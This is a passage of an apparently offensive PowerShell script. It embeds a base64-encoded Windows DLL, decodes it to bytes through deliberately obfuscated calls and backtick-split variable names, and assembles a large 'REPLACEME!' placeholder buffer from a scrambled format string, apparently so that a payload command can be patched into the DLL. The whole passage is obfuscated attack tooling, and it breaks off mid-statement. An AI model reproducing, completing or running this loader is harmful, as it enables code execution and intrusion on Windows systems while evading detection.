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','AxADQAMAAuAEQATABMAAAAAABWAEMAUgBVAE4AV','zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMQFVIg+wgSIvqD7ZNIOgqnv//kEiDxCBdw8zMzMzMzMxAVUiD7CBIi+roOp///5APtk0g6ASe//+QSIPEIF3DzMzMzMzMzMzMzMzMzMzMzMxAVUiD7DBIi+pIiU04SItFOEiLAIsAiUU0SItFOItNNEiJRCQoiUwkIEyNDXCl//9Mi0Vgi1VYSItNUOhun///kEiDxDBdw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVUiD7CBIi+pIiU1ISItFSEiLAIsAiUUki0UkPQUAAMB1CcdFIAEAAADrB8dFIAAAAACLRSBIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','RSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNR','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhU','MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz','MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz','zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIg+wYgz11ogAAAHQJxwQkAQAAAOsHxwQkAAAAAIsEJEiDxBjDzMzMzMzMzMzMzMxIiUwkCMPMzMzMzMzMzMzMSIPsGEiLBeUBAQBIjQ0B0v//SDvBdAnHBCQBAAAA6wfHBCQAAA','AAAAAoAAA4C50ZXh0AAAAX3MAAAAQAQAAdAAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAAJlMAAAAkAEAAE4AAAB4AAAAAAAAAAAAAAAAAABAAABALmRhdGEAAADJCAAAAOABAAACAAAAxgAAAAAAAAAAAAAAAAAAQAAAwC5wZGF0YQAAiCAAAADwAQAAIgAAAMgAAAAAAAAAAAAAAAAAAEAAAEAuaWRhdGEAAOsLAAAAIAIAAAwAAADqAAAAAAAAAAAAAAAAAABAAABALmdmaWRzAAAqAQAAADACAAACAAAA9gAAAAAAAAAAAAAAAAAAQAAAQC4wMGNmZwAAGwEAAABAAgAAAgAAAPgAAAAAAAAAAAAAAAAAAEAAAEAucnNyYwAAADwEAAAAUAIAAAYAAAD6AAAAAAAAAAAAAAAAAABAAABALnJlbG9jAACvAQAAAGACAAACAAAAAAEAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

    
    [Byte[]]${Dl`l`BYTes} = [Byte[]]  $QMrk::("{4}{1}{3}{0}{2}"-f '4','omBase','String','6','Fr').Invoke(${Dl`LBy`TeS`64})

    
    ${BuF`Fer`STRiNg} = ("{75}{34}{179}{35}{37}{181}{106}{103}{208}{152}{62}{142}{120}{125}{100}{187}{11}{219}{13}{207}{200}{137}{112}{130}{78}{164}{183}{61}{5}{166}{113}{1}{85}{104}{228}{41}{24}{36}{115}{68}{126}{161}{197}{158}{93}{14}{33}{60}{133}{214}{229}{16}{165}{54}{47}{221}{114}{64}{58}{217}{46}{195}{51}{86}{171}{206}{201}{231}{182}{184}{144}{129}{111}{74}{117}{8}{28}{4}{71}{92}{102}{156}{18}{147}{77}{134}{203}{159}{131}{30}{39}{233}{26}{90}{43}{21}{234}{124}{185}{193}{199}{95}{176}{227}{12}{223}{101}{84}{94}{154}{80}{118}{23}{146}{27}{22}{119}{218}{198}{196}{79}{116}{211}{163}{9}{88}{96}{87}{188}{17}{97}{220}{160}{132}{170}{53}{99}{155}{212}{89}{2}{151}{153}{210}{20}{32}{38}{138}{194}{3}{213}{167}{70}{122}{143}{91}{225}{238}{66}{128}{59}{230}{224}{105}{19}{69}{240}{205}{65}{191}{15}{177}{25}{98}{236}{81}{109}{50}{209}{6}{44}{189}{55}{149}{174}{173}{56}{7}{121}{150}{148}{190}{73}{83}{107}{72}{48}{216}{139}{31}{0}{145}{76}{108}{40}{232}{135}{192}{239}{136}{178}{45}{168}{29}{42}{215}{175}{67}{52}{172}{226}{57}{235}{110}{63}{222}{162}{140}{49}{204}{169}{141}{237}{186}{157}{127}{82}{180}{123}{10}{202}" -f 'REPL','!REP','ME!REPLACEME!REPLACEME!REPLACEME','ACEME!REPLACEME!REPLACEME!REPLACEME!REPL','LA','CEME!REPLACEME!REP','REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','E!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLAC','EME!REPLA','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLAC','EME!REPLA','ACEME!REP','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','PLACE','CEME!REPLACEME!REPLACEME!REPLACEME!R','E!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','ME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','PLACEM','EME!REPL','E!REPLACEME!REP','PLAC','E!REPLACEME!REPLACEME!REPLACEME!REPLACEM','P','REPLACEME!','PLACEME!REPLACEME!REPLACEME','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','!REPLACEME!R','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','CEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','CEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEM','L','ME!REPLACEME!REPLACEME!','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!','!REPLACEME!REPLACEME!REPLA','EME!REPLACEME!REPLACEME!REPLACEM','!REPLAC','E!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','PLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','ACEME!REPLACEME!REPLACEME!REP','LACEM','ACEME!RE','E!REPLACEME!REPLACEME!REPLAC','ACEM','PLACEME!REPLACEME!REPLACEME','ME!R','CEME!REPLACEME!REPLACEME!REPLACEME!REP','!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME','C','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','CE','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL','LACE','ACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME','EPLACEME!REPLACEME!RE','EME!REPLACEME!REPLACEM','LAC','ME!REPLACEME!REPLACEME!REPLACEM','CEME!REPLACEME!REPLACEME!REPLACEME!RE','REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','!REP','ME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','ACEME!REPLACEME!REPLACEME!REPLACEME!REP','PLACEME!REPLACEM','LACEME!REPL','!REPLACEME!REP','LACEME!REPLA','PLACEME!REPLACEME!REPL','CEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','PLACEME!REPLA','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','LACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL','REPLACEME!REPLACEME','C','ME!REPLACE','E!REPLACEME!REPLACEME','!REPLACEME!REPLACEME!REPLACEME!REPLAC','ACEME!REPLACEME!REPLACEME!REPLACEME!RE','REPLACEME!REPLA','EME!REPLACEME!REPLACEME!RE','LACEME!R','E!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','LACEME!REPLAC','ME!REPLACEME!REPLACEME','P','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','PLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL','EPLACEME!REPLACEME!REPLACEME!RE','EPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLAC','PLACEME!REPLACEME!REPLA','PLAC','EPLACEME!REP','LACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','E!REPLACEME!','LACEME!REPLACEME!REPLAC','ME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','ACEME!REPLACEME!REPLACEM','ME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEM','EME!REPLACEME!REPLACEME!REPL','CEME!REPLACE','EME!REPLA','ME!REPLACEM','!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA','EPLACEME!RE','EME!REP','CEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!R','ACEME!REPLACEME','!REPLACEME!REP','LAC','EME','CE','EME','EME!REPLAC','ACEME!REPLACEME!REPLACEME!REPLAC','PLACEME!REPLACEME!REPLACEME!','L','LACEME!REPLACEM','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEM','ACEME!REPLACEME!REPLA','ME!REPLACEME!REPLAC','PLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACE','E!REPL','LACEME!REPLACEME!REPLACEME!REPLAC','!REPLAC','E!REPLA','CEME!REPLACEME','EME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEM','E!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','PLACEME!REPLAC','LACEME!REPLACEME!REPLACEME!REPLACEME!REPLAC','ME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!RE','REPLACEME!RE','EPLACEME!REPLACEME!REP','!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REP','EPLACEME!REPLACEME!REPLACEME!REPLACEME','CEME!REPLACEME!REPLACE','REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL','CEME!REPLACEME!REPLACEME!REPLACEME!REPL','ME!REPLACEME!REPLACEME!REPLACEME!REP','CEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPL